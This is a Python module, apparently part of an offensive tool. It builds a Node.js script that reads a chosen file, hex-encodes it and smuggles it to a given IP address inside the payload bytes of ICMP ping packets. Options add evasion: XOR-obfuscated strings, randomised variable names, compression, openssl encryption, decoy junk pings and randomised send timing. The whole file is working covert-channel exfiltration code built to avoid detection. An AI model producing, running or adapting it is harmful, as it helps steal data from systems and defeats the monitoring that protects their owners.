import random

from ..obfuscation import xor_key, xor_encode


def _node_payload(file_path, ip, period, random_delay, randomize=False, junk=0, randomize_junk=False, compress=False, encrypt=None, passphrase='', estimate=False, obfuscate_strings=False):
    node_file = file_path.replace("\\", "\\\\").replace("'", "\\'")

    template = """const FS=require('fs'),CR=require('crypto'),ZL=require('zlib'),CP=require('child_process');
const f='__FILE__',ip='__IP__',p=__PERIOD__,rd=__RDELAY__;
const c=12,ib=3,r=5,t=2;
let data=FS.readFileSync(f);
const hsh=CR.createHash('sha256').update(data).digest('hex');
let hx=data.toString('hex');
const dsz=data.length;
const tot=Math.ceil(dsz/c);
if(tot>2**(8*ib)){process.stderr.write("[-] File too large\\n");process.exit(1);}
if(rd!=0){process.stdout.write(`[+] Sending '${f}' (${dsz} bytes) to '${ip}' in ${tot} pings every (${p} +- ${rd}) s\\n`);}
else if(p!=0){process.stdout.write(`[+] Sending '${f}' (${dsz} bytes) to '${ip}' in ${tot} pings every ${p} s\\n`);}
else{process.stdout.write(`[+] Sending '${f}' (${dsz} bytes) to '${ip}' in ${tot} pings\\n`);}
if(rd>p){process.stderr.write(`[!] WARNING: random-delay (${rd} s) > period (${p} s)\\n`);}
let ls=false;const t0=Date.now()/1000;
const wb=new Int32Array(new SharedArrayBuffer(4));
for(let i=0;i<tot;i++){
const idx=i.toString(16).padStart(6,'0');
const chunk=hx.slice(i*24,i*24+24);
const pat=idx+chunk;
let ok=false;
for(let a=0;a<r;a++){
if(ls){
if(rd!=0){let sl=p+(Math.random()*2-1)*rd;if(sl<0)sl=0;Atomics.wait(wb,0,0,Math.round(sl*1000));}
else if(p!=0){Atomics.wait(wb,0,0,Math.round(p*1000));}
}
ls=true;
const sz=Math.floor(pat.length/2);
const res=CP.spawnSync('ping',['-c','1','-W',String(t),'-s',String(sz),'-p',pat,ip],{stdio:'ignore'});
if(res.status===0){ok=true;break;}
}
if(!ok){process.stderr.write(`[-] No reply for ping ${i}, transfer aborted\\n`);process.exit(1);}
const s=i+1;
if(p!=0||rd!=0){
const el=Date.now()/1000-t0;
const eh=Math.floor(el/3600);const em=Math.floor((el%3600)/60);const es=Math.floor(el%60);
let by=s*c;if(by>dsz)by=dsz;
const pct=Math.floor(100*s/tot);
process.stdout.write(`\\r  ${s}/${tot} pings, ${by}/${dsz} bytes, ${pct}%, elapsed ${String(eh).padStart(2,'0')}:${String(em).padStart(2,'0')}:${String(es).padStart(2,'0')}`);
if(rd==0&&s>0){
const rm=Math.floor(el*(tot-s)/s);const rh=Math.floor(rm/3600);const rmm=Math.floor((rm%3600)/60);const rss=Math.floor(rm%60);
process.stdout.write(`, remaining ~${String(rh).padStart(2,'0')}:${String(rmm).padStart(2,'0')}:${String(rss).padStart(2,'0')}`);}
}else if(s%100==0){process.stdout.write(`  ${s}/${tot}\\n`);}
}
process.stdout.write("\\n");
process.stdout.write("=".repeat(50)+"\\n");
process.stdout.write(" ".repeat(21)+"DONE\\n");
process.stdout.write("=".repeat(50)+"\\n\\n");
process.stdout.write(`[*] SHA-256: ${hsh}\\n`);
"""

    script = template
    _xor_key = None
    if obfuscate_strings:
        _xor_key = xor_key()
        key_str = ','.join(str(b) for b in _xor_key)
        decode_block = (
            "const _k=[" + key_str + "];\n"
            "const _d=(h)=>{let r='';for(let z=0;z<h.length;z+=2){r+=String.fromCharCode(parseInt(h.substr(z,2),16)^_k[(z/2)%_k.length]);}return r;};\n"
        )
        script = script.replace(
            "const f='__FILE__',ip='__IP__',",
            decode_block + "const f=_d('__XFILE__'),ip=_d('__XIP__'),"
        )
    if compress:
        script = script.replace(
            "let hx=data.toString('hex');\n",
            "const osz=data.length;\n"
            "data=ZL.gzipSync(data);\n"
            "const csz=data.length;\n"
            "process.stdout.write(`[*] Compressed: ${osz} -> ${csz} bytes (${(100.0*csz/osz).toFixed(1)}%)\\n`);\n"
            "let hx=data.toString('hex');\n"
        )
    if encrypt:
        node_pass = passphrase.replace("\\", "\\\\").replace("'", "\\'")
        if obfuscate_strings:
            pp_line = "const pp=_d('__XPP__');\n"
        else:
            pp_line = "const pp='__PP_VALUE__';\n"
        encrypt_code = (
            pp_line +
            "const ep=CP.spawnSync('openssl',['enc','-" + encrypt + "','-pbkdf2','-iter','10000','-md','sha256','-pass','pass:'+pp],{input:data});\n"
            "data=ep.stdout;\n"
            "process.stdout.write(\"[*] Encrypted with " + encrypt + "\\n\");\n"
        )
        script = script.replace(
            "let hx=data.toString('hex');\n",
            encrypt_code + "let hx=data.toString('hex');\n"
        )
    if junk > 0:
        script = script.replace(
            'const c=12,ib=3,r=5,t=2;',
            f'const c=12,ib=3,r=5,t=2,J={junk};'
        )
        if randomize_junk:
            junk_data = "const jd='ff'+CR.randomBytes(14).toString('hex');\n"
        else:
            junk_data = "const jd='ffffff'+CR.randomBytes(12).toString('hex');\n"
        junk_code = (
            "for(let j=0;j<J;j++){\n" +
            junk_data +
            "if(ls){\n"
            "if(rd!=0){let sl=p+(Math.random()*2-1)*rd;if(sl<0)sl=0;Atomics.wait(wb,0,0,Math.round(sl*1000));}\n"
            "else if(p!=0){Atomics.wait(wb,0,0,Math.round(p*1000));}\n"
            "}\n"
            "ls=true;\n"
            "CP.spawnSync('ping',['-c','1','-W',String(t),'-s','15','-p',jd,ip],{stdio:'ignore'});\n"
            "}\n"
        )
        script = script.replace("const s=i+1;\n", "const s=i+1;\n" + junk_code)
    if estimate:
        est_lines = (
            "process.stdout.write(\"[!] ESTIMATE OPTION ENABLED \u2014 the file will NOT be transferred\\n\");\n"
            "process.stdout.write(`[*] File size (after processing): ${dsz} bytes\\n`);\n"
            "process.stdout.write(`[*] Data pings: ${tot}\\n`);\n"
        )
        if junk > 0:
            est_lines += (
                "process.stdout.write(`[*] Junk pings: ${tot*J}\\n`);\n"
                "process.stdout.write(`[*] Total pings: ${tot*(1+J)}\\n`);\n"
            )
            total_expr = "tot*(1+J)"
        else:
            est_lines += "process.stdout.write(`[*] Total pings: ${tot}\\n`);\n"
            total_expr = "tot"
        est_lines += (
            "if(p!=0){\n"
            "const et=" + total_expr + "*p;const h=Math.floor(et/3600);const m=Math.floor((et%3600)/60);const ss=Math.floor(et%60);\n"
            "process.stdout.write(`[*] Estimated time: ~${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(ss).padStart(2,'0')}\\n`);\n"
            "}\n"
            "process.stdout.write(`[*] SHA-256: ${hsh}\\n`);\n"
            "process.exit(0);\n"
        )
        script = script.replace("let ls=false;const t0=Date.now()/1000;\n", est_lines)

    if randomize:
        import re
        var_names = [
            'FS', 'CR', 'ZL', 'CP',
            'f', 'ip', 'p', 'rd',
            'c', 'ib', 'r', 't',
            'data', 'hsh', 'hx', 'dsz', 'tot',
            'ls', 't0', 'wb',
            'i', 'idx', 'chunk', 'pat', 'ok',
            'a', 'sl', 'sz', 'res', 's',
            'el', 'eh', 'em', 'es', 'by', 'pct',
            'rm', 'rh', 'rmm', 'rss',
        ]
        if compress:
            var_names.extend(['osz', 'csz'])
        if encrypt:
            var_names.extend(['pp', 'ep'])
        if junk > 0:
            var_names.extend(['J', 'j', 'jd'])
        if estimate:
            var_names.extend(['et', 'h', 'm', 'ss'])
        if obfuscate_strings:
            var_names.extend(['_k', '_d'])
        letters = 'abcdefghijklmnopqrstuvwxyz'
        alphanums = letters + '0123456789'
        js_reserved = {'for', 'let', 'var', 'new', 'try', 'now'}
        original_names = set(var_names)
        used = set()
        mapping = {}
        for name in var_names:
            while True:
                rand_name = random.choice(letters) + ''.join(random.choices(alphanums, k=2))
                if rand_name not in used and rand_name not in js_reserved and rand_name not in original_names:
                    used.add(rand_name)
                    mapping[name] = rand_name
                    break
        for old_name in sorted(var_names, key=len, reverse=True):
            if len(old_name) == 1:
                pattern = r'(?<![-\\])\b' + re.escape(old_name) + r'\b'
            else:
                pattern = r'\b' + re.escape(old_name) + r'\b'
            script = re.sub(pattern, mapping[old_name], script)

    period_str = f"{period:g}"
    rdelay_str = f"{random_delay:g}"

    if obfuscate_strings:
        script = (script
                  .replace('__XFILE__', xor_encode(file_path, _xor_key))
                  .replace('__XIP__', xor_encode(ip, _xor_key))
                  .replace('__PERIOD__', period_str)
                  .replace('__RDELAY__', rdelay_str))
        if encrypt:
            script = script.replace('__XPP__', xor_encode(passphrase, _xor_key))
    else:
        script = (script
                  .replace('__FILE__', node_file)
                  .replace('__IP__', ip)
                  .replace('__PERIOD__', period_str)
                  .replace('__RDELAY__', rdelay_str))
        if encrypt:
            script = script.replace('__PP_VALUE__', node_pass)

    return script
